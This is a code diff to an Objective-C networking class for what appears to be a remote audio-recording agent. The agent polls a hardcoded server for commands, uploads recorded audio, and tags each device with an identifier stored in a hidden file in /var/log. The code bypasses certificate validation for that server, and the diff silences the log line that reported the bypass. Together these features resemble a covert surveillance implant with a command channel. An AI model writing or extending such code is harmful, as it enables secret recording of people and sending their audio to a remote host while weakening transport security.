@@ -1,14 +1,26 @@
 #import "APIService.h"
 
+// Check if we are building for an iOS-based target (where UIDevice is available)
+#if TARGET_OS_IPHONE
+    // Import UIKit to access UIDevice for identifierForVendor
+    #import <UIKit/UIDevice.h>
+#endif
+
 // --- Configuration Constants ---
 static NSString *const HardcodedBaseURL = @"https://192.168.1.10:5000";
 static NSString *const TargetInsecureHost = @"192.168.1.10";
-static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567"; 
+
+// macOS Persistence Filename
+static NSString *const kDeviceIDFilename = @".recagent_device_id";
 
 // --- Private Class Extension ---
 @interface APIService ()
 @property (nonatomic, strong, readwrite) NSString *baseURL;
 @property (nonatomic, strong, readwrite) NSURLSession *session;
+// New method declaration for dynamic device ID
+- (NSString *)deviceId;
+// Private method for macOS file persistence
+- (NSString *)getOrCreatePersistentIDForMacOS;
 
 - (NSData *)createBodyWithBoundary:(NSString *)boundary
                         parameters:(NSDictionary *)parameters
@@ -40,9 +52,88 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
         // Initialize Custom Session for ATS Bypass
         NSURLSessionConfiguration *configObj = [NSURLSessionConfiguration defaultSessionConfiguration];
         self.session = [NSURLSession sessionWithConfiguration:configObj delegate:self delegateQueue:nil];
+        
+        // Log the Device ID on startup
+        NSLog(@"Initialized APIService. Device ID: %@", [self deviceId]);
     }
     return self;
 }
+
+#pragma mark - Device Identifier Logic
+
+/**
+ * @brief Retrieves a unique identifier for the agent/device.
+ *
+ * This uses the semi-persistent UIDevice.identifierForVendor on iOS.
+ * On macOS, it reads a UUID persisted in a log file.
+ * @return The device ID string.
+ */
+- (NSString *)deviceId {
+    
+    NSString *deviceID = nil;
+    
+#if TARGET_OS_IPHONE
+    // 1. iOS: Use the semi-persistent identifierForVendor
+    @try {
+        deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
+    }
+    @catch (NSException *exception) {
+        NSLog(@"Warning: Failed to retrieve identifierForVendor: %@", exception.reason);
+        deviceID = nil;
+    }
+#else
+    // 2. macOS/Other: Use file-based persistence for a stable ID
+    deviceID = [self getOrCreatePersistentIDForMacOS];
+#endif
+
+    if (!deviceID) {
+        // Fallback for extreme failure cases (ephemeral ID)
+        deviceID = [[[NSUUID UUID] UUIDString] lowercaseString];
+        NSLog(@"CRITICAL FALLBACK: Using ephemeral NSUUID.");
+    }
+    
+    return [deviceID lowercaseString]; // Ensure consistent formatting
+}
+
+/**
+ * @brief Gets or creates a stable UUID stored in a log file on macOS.
+ *
+ * @return A stable device ID string.
+ */
+- (NSString *)getOrCreatePersistentIDForMacOS {
+    // We use the same log directory as the AudioRecorderManager for consistency
+    NSString *logPath = @"/var/log/";
+    NSString *filePath = [logPath stringByAppendingPathComponent:kDeviceIDFilename];
+    
+    // 1. Try to read existing ID
+    NSData *data = [[NSFileManager defaultManager] contentsAtPath:filePath];
+    if (data) {
+        NSString *existingID = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+        if (existingID.length > 0) {
+            // NSLog(@"Loaded persistent macOS ID from file: %@", existingID);
+            return existingID;
+        }
+    }
+    
+    // 2. Create new ID if file does not exist or is empty
+    NSString *newID = [[NSUUID UUID] UUIDString];
+    NSData *newIDData = [newID dataUsingEncoding:NSUTF8StringEncoding];
+    
+    NSError *error = nil;
+    // Ensure the directory exists (it should, as the AudioRecorderManager checks it)
+    [[NSFileManager defaultManager] createDirectoryAtPath:logPath withIntermediateDirectories:YES attributes:nil error:&error];
+    
+    // Write the new ID to the file
+    if ([newIDData writeToFile:filePath options:NSDataWritingAtomic error:&error]) {
+        NSLog(@"Generated and persisted new macOS Device ID to file.");
+        return newID;
+    } else {
+        NSLog(@"Error persisting macOS Device ID to file: %@", error.localizedDescription);
+        // Fallback to returning the new ID without persisting it
+        return newID;
+    }
+}
+
 
 #pragma mark - NSURLSessionDelegate (ATS Bypass)
 
@@ -58,7 +149,7 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
         completionHandler(NSURLSessionAuthChallengeUseCredential, 
                           [[NSURLCredential alloc] initWithTrust:challenge.protectionSpace.serverTrust]);
         
-        NSLog(@"[ATS Bypass] Certificate accepted for %@", TargetInsecureHost);
+        // NSLog(@"[ATS Bypass] Certificate accepted for %@", TargetInsecureHost);
         return;
     }
     
@@ -74,7 +165,8 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
     
     NSString *fullEndpoint = endpoint;
     if ([endpoint isEqualToString:@"/get-command"]) {
-        fullEndpoint = [NSString stringWithFormat:@"%@?device_id=%@", endpoint, HardcodedDeviceID];
+        // Use dynamically generated Device ID
+        fullEndpoint = [NSString stringWithFormat:@"%@?device_id=%@", endpoint, [self deviceId]];
     }
     
     NSString *urlString = [self.baseURL stringByAppendingString:fullEndpoint];
@@ -108,7 +200,8 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
     
     NSMutableDictionary *mutablePayload = [payload mutableCopy];
     if ([endpoint isEqualToString:@"/set-command"]) {
-        [mutablePayload setObject:HardcodedDeviceID forKey:@"device_id"];
+        // Use dynamically generated Device ID
+        [mutablePayload setObject:[self deviceId] forKey:@"device_id"];
     }
     
     NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
@@ -155,7 +248,8 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
 
     NSMutableDictionary *mutableParameters = parameters ? [parameters mutableCopy] : [NSMutableDictionary dictionary];
     if ([endpoint isEqualToString:@"/upload"]) {
-        [mutableParameters setObject:HardcodedDeviceID forKey:@"device_id"];
+        // Use dynamically generated Device ID
+        [mutableParameters setObject:[self deviceId] forKey:@"device_id"];
     }
 
     NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
@@ -171,7 +265,6 @@ static NSString *const HardcodedDeviceID = @"01234567012345670123456701234567";
                                            fileKey:@"audio"
                                           fileData:fileData
                                           fileName:[filePath lastPathComponent]
-                                          // FIX: Use 'audio/mp4' to match AAC recording format
                                           mimeType:@"audio/mp4" 
                                              error:&bodyError];
     
